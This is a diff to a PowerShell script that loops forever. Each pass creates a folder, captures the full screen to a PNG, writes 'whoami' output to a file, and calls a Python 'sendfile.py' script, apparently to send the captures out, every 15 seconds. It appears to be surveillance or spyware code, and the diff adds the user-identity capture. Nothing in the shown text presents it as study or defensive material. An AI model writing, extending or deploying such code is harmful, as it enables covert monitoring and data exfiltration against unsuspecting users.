@@ -1,8 +1,13 @@
-start-Sleep 2
-
 while ($True)
 {
-	$File = 'img.png'
+	New-Item -Name "F" -ItemType "directory"
+
+	Start-Sleep -Seconds 2
+
+	cd F
+
+
+	$File = 'Desktop\F\img.png'
 	Add-Type -AssemblyName System.Windows.Forms
 	Add-type -AssemblyName System.Drawing
 	$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
@@ -14,8 +19,18 @@ while ($True)
 	$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
 	$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
 	$bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Png) 
+
+	whoami > whoami.txt
+
+	cd..
+
 	
 	python ./sendfile.py
+
+	
+
+
 	Start-Sleep -Seconds 15
+
 
 }
